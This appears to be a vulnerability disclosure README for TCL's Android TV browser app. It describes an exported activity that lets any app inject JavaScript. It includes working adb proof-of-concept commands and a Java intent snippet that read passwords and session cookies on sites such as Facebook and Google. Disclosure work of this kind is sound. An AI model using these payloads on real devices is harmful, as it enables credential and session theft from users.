*** This vulnerability was initially disclosed to TCL on 9/2023 & is still vulnerable as of this commit. ***


![image](https://github.com/actuator/com.tcl.browser/assets/78701239/82062ff5-9806-499b-85ed-68cb3594e8ae)



## Vulnerability Report

### Overview:
A Remote Code Execution (RCE) vulnerability has been discovered in the `com.tcl.browser` application on the Android platform. The vulnerability allows an attacker to execute arbitrary JavsScript code within the context of the application without any permissions.

### Application Details:

- **Vendor:** - Shenzhen TCL New Technology Co., Limited
- **Application Name:** 'Browser TV Web - BrowseHere' com.tcl.browser
- **Version:** 6.60.055_e974ebe7_231109_gp
- **Component:** com.tcl.browser.portal.browse.activity.BrowsePageActivity

### Vulnerability Details:

- **Vulnerability Type:** Remote Code Execution (RCE)
- **Attack Vector:** Via an exported activity component
- **Permissions Required:** None

### Description:

The `com.tcl.browser.portal.browse.activity.BrowsePageActivity` activity in the `com.tcl.browser` app is exported and can be invoked by any third-party application without requiring any permissions. A malicious app can exploit this to execute arbitrary JavaScript code within the context of the `com.tcl.browser` application.

This vulnerability is particularly concerning because:
- The victim does not need to grant any special permissions to any installed applications.
- The attack can be initiated remotely.

### Proof of Concept (PoC):


![image](https://github.com/actuator/com.tcl.browser/blob/main/poc.gif)

These ADB commands inject JavaScript to extract password data & browser session cookie & can be accomplished without ADB with no permissions.


```bash
adb shell am start -a android.intent.action.VIEW -d 'javascript:(function()%7Bvar%20password%20%3D%20document.getElementById(%27pass%27).value%3Balert(%27Password%3A%20%27%20%2B%20password)%3B%7D)()' com.tcl.browser/com.tcl.browser.portal.browse.activity.BrowsePageActivity
```

Facebook.com

![image](https://github.com/actuator/com.tcl.browser/blob/main/Facebook.gif)


```
adb shell am start -a android.intent.action.VIEW -d 'javascript:(function()%7Bvar%20initialValue%20%3D%20document.querySelector(%27input[data-initial-value]%27).getAttribute(%27data-initial-value%27)%3Balert(%27Initial%20Data%20Value%3A%20%27%20%2B%20initialValue)%3B%7D)()' com.tcl.browser/com.tcl.browser.portal.browse.activity.BrowsePageActivity
```

Google.com

![image](https://github.com/actuator/com.tcl.browser/blob/main/Gmail.gif)

Session Cookie Theft: 



```
adb shell am start -a android.intent.action.VIEW -d 'javascript:(function()%7Balert(%27Session%20Cookies%3A%20%27%20%2B%20document.cookie)%3B%7D)()' com.tcl.browser/com.tcl.browser.portal.browse.activity.BrowsePageActivity
```
![image](https://github.com/actuator/com.tcl.browser/blob/main/cookie.gif)


---

To demonstrate the vulnerability, one can create a simple Android app that invokes the exported `BrowsePageActivity` activity:


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Create the intent to start the BrowsePageActivity of com.tcl.browser app
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setComponent(new ComponentName("com.tcl.browser", "com.tcl.browser.portal.browse.activity.BrowsePageActivity"));

        // Set the URL data you want to pass (for example "http://www.example.com")
        intent.setData(Uri.parse("http://www.example.com"));
        // OR intent.setData(Uri.parse("javascript:alert('...');"));

        // Start the activity
        startActivity(intent);
        finish();
    }



### Impact:

Successful exploitation allows an attacker to:
- Execute arbitrary JavaScript code within the context of the `com.tcl.browser` app.

The enabled 'settings.setDomStorageEnabled(true)' value in the app's WebView allows for the use of the Web Storage API.

Risks include:

Credential harvesting if websites store sensitive data.
Manipulating or flooding stored values.
Assisting in malicious persistence.

### Mitigation and Recommendations:

1. **Restrict Activity Export:** Do not export activities unless necessary.
If required, implement proper authorization checks to ensure that only legitimate entities can invoke it.


